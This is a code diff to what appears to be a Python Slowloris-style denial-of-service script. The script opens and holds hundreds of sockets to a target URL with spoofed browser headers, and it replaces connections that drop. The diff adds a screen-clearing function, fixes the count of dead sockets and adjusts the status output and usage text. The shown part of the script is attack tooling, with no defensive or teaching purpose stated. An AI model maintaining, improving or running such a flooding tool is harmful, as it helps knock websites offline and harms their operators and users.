@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
+import os
 import sys
 import time
 import random
@@ -9,6 +10,7 @@ import argparse
 import atexit
 import signal
 import datetime
+# import requests
 
 headers = ['User-Agent: Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9b5) Gecko/2008050509 Firefox/3.0b5',
 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
@@ -20,6 +22,8 @@ soketCount = 300
 URL = ''
 line = '-' * 69
 
+def clearScreen():
+	os.system('cls' if os.name == 'nt' else 'clear')
 
 def parseArgs():
 	global soketCount, URL
@@ -64,7 +68,7 @@ def run():
 		sys.stdout.flush()
 		sokets.append(i)
 
-	sys.stdout.write('\r[+] Socket created: %d\n' % cnt)
+	sys.stdout.write('\r[+] Socket Created: %d\n' % cnt)
 
 	sends = 0
 	die = 0
@@ -77,14 +81,15 @@ def run():
 			except:
 				sokets.remove(sk)
 				die += 1
-		sys.stdout.write('\r send: %d\t die: %d \t alive: %d' % (sends, die, cnt))
+				cnt -= 1
+		sys.stdout.write('\r\t\tsend: %d\t die: %d \t alive: %d' % (sends, die, cnt))
 		sys.stdout.flush()
 
 		while soketCount - len(sokets):
 			s = createSocket()
 			cnt += 1
 			sokets.append(s)
-			sys.stdout.write('\r\t\t send: %d\t die: %d\t count: %d' % (sends, die, cnt))
+			sys.stdout.write('\r\t\tsend: %d\t die: %d\t alive: %d' % (sends, die, cnt))
 			sys.stdout.flush()
 
 		time.sleep(3)
@@ -95,8 +100,9 @@ def ex(signal, frame):
 	sys.exit(0)
 
 def main():
+	clearScreen()
 	if len(sys.argv) < 2:
-		print 'Usage: \n -u \t http://www.google.com [str]\n -s \t socket count [int]'
+		print '\nUsage: \n -u \t google.com [str]\n -s \t socket count [int]\n\n'
 		sys.exit(-1)
 	else:
 		signal.signal(signal.SIGINT, ex)
